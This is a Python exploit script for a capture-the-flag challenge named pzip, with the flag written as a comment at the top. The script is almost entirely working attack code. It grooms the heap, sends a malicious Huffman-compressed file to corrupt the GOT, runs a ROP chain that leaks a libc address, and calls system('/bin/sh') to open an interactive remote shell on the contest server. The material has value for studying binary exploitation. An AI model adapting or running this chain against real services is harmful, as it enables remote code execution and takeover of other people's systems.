from pwnlib import *

# PCTF{sometimes_zippers_require_force}

def recv_n(n):
	buf = ""
	while len(buf) != n:
		buf += s.recv(1)
	return buf

def compress(data):
	assert len(data) >= 2000
	s.send("COMPRESS %d\n" % len(data))
	s.send(data)
	s.ru("SUCCESS ")
	length = int(s.ru("\n"))
	return recv_n(length)

def decompress(c):
	s.send("DECOMPRESS %d\n" % len(c))
	s.send(c)
	s.ru("SUCCESS ")
	length = int(s.ru("\n"))
	return recv_n(length)

def extend(c, appendum, wait=True):
	cmd = "EXTEND %d %d" % (len(c), len(appendum))
	s.send(cmd + "\n")
	s.send(c)
	s.send(appendum)
	if wait:
		s.ru("SUCCESS ")
		length = int(s.ru("\n"))
		return recv_n(length)

def build_harr(mapping):
	harr = []
	for i in range(256):
		if i == 0: # special case
			assert mapping[0] is None
			harr += [1]*16 + [0] + [1]*16
			continue
		if mapping[i] is None:
			harr += [0]
		else:
			value = mapping[i]
			value = bin(value)[2:]
			while len(value) < 64:
				value = "0" + value
			value = [int(j) for j in value]
			value = value[::-1]
			harr += [1]*len(value) + [0] # indicate length
			harr += value
	return harr

def bits_to_bytes(bits):
	res = ""
	while len(bits) % 8 != 0:
		bits += [1] # pad it up..
	for i in range(0, len(bits)/8):
		b = bits[i*8:i*8+8]
		b = "".join(str(j) for j in b)[::-1]
		b = int(b, 2)
		res += chr(b)
	return res

def build_header(harr):
	compressed_size = len(harr)/8
	decompressed_size = 0x11223344
	header = ""
	header += "PZP"
	header += "\x00" # bitoff
	header += pd(decompressed_size)
	header += pd(compressed_size)
	return header

def build_data(harr):
	return build_header(harr) + bits_to_bytes(harr)

def standard_mapping():
	mapping = {}
	for i in range(256):
		mapping[i] = None
	return mapping


target = 0x603000 # just spray all over the GOT

mapping = standard_mapping()


#mapping[0] is reserved as a two-byte pad!
mapping[1] = target - 0x000000000000066c
mapping[2] = 0x00402436 # free -> main
mapping[3] = 0x00000000004009bd # strtok -> pivot
mapping[4] = 0x00400866 # fgets -> fgets
mapping[5] = 0x00000000004008b6 # fflush -> fflush
mapping[6] = 0xd0d0d0d0



payload  = [5]*(200 - 12)
payload += [1]
payload += [2] # free
payload += [6]*2
payload += [2] # printf
payload += [6]*2
payload += [4] # fgets
payload += [6]*4
payload += [5]
payload += [6]*2
payload += [3] # strtok
payload += [6]
payload  = "".join(chr(c) for c in payload)


# build huffman array for the mapping
harr = build_harr(mapping)
data = build_data(harr)


#s = Socket(("localhost", 5553))
s = Socket(("pzip.pwning.xxx", 9999))


### first some heap feng shui

a = "A"*0x17f8 # make this smaller to get them closer
b = "B"*0x28

s.send("EXTEND %d %d\n" % (len(a), len(b)))
s.send(a)
s.send(b)
s.ru("FAILURE Unable to act\n")


### then some memory corruption

extend(data, payload, wait=False)

### and now let's get ROP

printf = 0x0000000000400836
fgets_got = 0x603030

payload = ""


def set_rdi(val):
	payload  = pq(0x00000000004009c2)
	payload += pq(val + 0x410)
	payload += pq(0x402482)
	payload += pq(1)*2
	return payload


payload += pq(0x402435)

payload += set_rdi(fgets_got)
payload += pq(printf)

payload += set_rdi(0x4026da)
payload += pq(printf)

# get stdout into rdi
payload += set_rdi(0x6030a0)
payload += pq(0x400d2d)
payload += pq(1)
payload += pq(0x40248c)
payload += pq(1)*2

# then fflush
payload += pq(0x00000000004008b6)

# and read in another payload
payload += pq(0x402436)

s.send(payload + "\n")

libc_base = uq(s.ru(" \n").ljust(8, chr(0))) - 0x6e220
print "libc: 0x%x" % libc_base
assert libc_base & 0xfff == 0

system = libc_base + 0x46640
bin_sh = libc_base + 1559771

payload = ""
payload += set_rdi(bin_sh)
payload += pq(system)

s.send(payload + "\n")

print "shell?"




s.interact()
